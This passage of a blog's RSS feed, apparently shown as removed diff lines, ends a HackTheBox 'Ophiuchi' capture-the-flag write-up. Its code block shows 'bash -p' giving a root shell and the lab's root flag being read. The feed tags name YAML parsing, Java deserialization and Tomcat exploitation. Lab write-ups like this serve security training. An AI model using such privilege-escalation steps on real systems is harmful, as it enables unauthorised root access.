-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:/tmp$ bash -p
-bash-5.0# whoami
-root
-bash-5.0# cd /root
-bash-5.0# cat root.txt 
-0a7279e90650d908863ec8e8155efb52
-bash-5.0#
-&lt;/code&gt;&lt;/pre&gt;
-</description>
-        <pubDate>Fri, 24 Mar 2023 00:00:00 +0000</pubDate>
-        <link>http://localhost:4000/hackthebox/htb-writeup-Ophiuchi</link>
-        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Ophiuchi</guid>
-        
-        <category>yaml parser</category>
-        
-        <category>java deserealization</category>
-        
-        <category>tomcat explotation</category>
         
         
         <category>hackthebox</category>
